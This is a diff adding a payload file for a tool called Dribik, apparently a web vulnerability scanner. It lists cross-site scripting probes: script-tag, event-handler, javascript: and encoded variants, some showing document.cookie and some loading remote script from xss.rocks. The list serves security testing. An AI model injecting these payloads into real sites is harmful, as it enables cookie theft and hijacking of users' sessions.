@@ -1,0 +1,32 @@
+# XSS Payloads for Dribik
+# Context-aware reflected/stored/DOM XSS probes
+
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+javascript:alert(1)
+%3Cscript%3Ealert(1)%3C/script%3E
+<script>alert(document.cookie)</script>
+"><script>alert(document.cookie)</script>
+<script src="https://xss.rocks/xss.js"></script>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>alert(/XSS/.source)</SCRIPT>
+<IMG SRC=`javascript:alert("XSS")`>
+<a onmouseover="alert(1)">hover me</a>
+<div style="width:expression(alert(1))">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
